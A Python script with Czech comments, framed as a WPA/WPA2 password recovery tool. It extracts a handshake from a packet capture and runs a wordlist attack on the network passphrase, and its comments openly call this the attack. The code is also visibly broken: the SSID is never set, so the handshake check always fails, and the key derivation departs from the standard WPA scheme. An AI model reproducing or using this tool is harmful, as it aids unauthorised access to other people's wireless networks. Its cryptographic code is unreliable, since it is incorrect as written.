import hashlib
import hmac
import binascii
import pyshark
import argparse
from tqdm import tqdm
from scapy.all import rdpcap, EAPOL

# Funkce pro PBKDF2-HMAC-SHA1
def derive_psk(ssid, password):
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)

# Funkce pro ověření MIC
def verify_mic(psk, anonce, snonce, ap_mac, client_mac, eapol_frame, mic):
    pmk = psk  # Pairwise Master Key (PMK)
    key_data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = hmac.new(pmk, key_data, hashlib.sha1).digest()[:32]  # Pairwise Transient Key (PTK)
    
    mic_calc = hmac.new(ptk, eapol_frame, hashlib.sha1).digest()[:16]
    return mic_calc == mic

# Funkce pro extrakci handshaku z .cap souboru
def extract_handshake(cap_file):
    cap = rdpcap(cap_file)
    ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = None, None, None, None, None, None, None
    
    for packet in cap:
        if packet.haslayer(EAPOL):
            if not anonce and packet.FCfield & 2:  # AP to Client
                anonce = bytes(packet.load[13:45])
                ap_mac = bytes(packet.addr2.replace(':', ''), 'utf-8')
            elif not snonce and packet.FCfield & 1:  # Client to AP
                snonce = bytes(packet.load[13:45])
                client_mac = bytes(packet.addr1.replace(':', ''), 'utf-8')
                mic = bytes(packet.load[-18:-2])
                eapol_frame = bytes(packet.load[:-18]) + b'\x00' * 16  # MIC zeroed
                
    if all([ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame]):
        return ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame
    else:
        print("[!] Handshake nebyl nalezen!")
        exit(1)

# Hlavní funkce pro útok
def crack_wpa(cap_file, wordlist_file):
    ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = extract_handshake(cap_file)
    
    print(f"[+] Útočím na síť: {ssid}")
    with open(wordlist_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f.readlines()]
    
    for password in tqdm(passwords, desc="Testing passwords"):
        print(f"Trying passphrase: {password}")
        psk = derive_psk(ssid, password)
        if verify_mic(psk, anonce, snonce, ap_mac, client_mac, eapol_frame, mic):
            print(f"\n[+] KEY FOUND! [ {password} ]")
            exit(0)
    
    print("[-] KEY NOT FOUND")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WPA/WPA2 Password Recovery Tool")
    parser.add_argument("cap_file", help=".cap soubor obsahující handshake")
    parser.add_argument("-P", "--passwords", help="Wordlist ve formátu .pwds", required=True)
    
    args = parser.parse_args()
    
    if not args.passwords.endswith(".pwds"):
        print("[!] Pouze wordlisty ve formátu .pwds jsou podporovány!")
        exit(1)
    
    crack_wpa(args.cap_file, args.passwords)
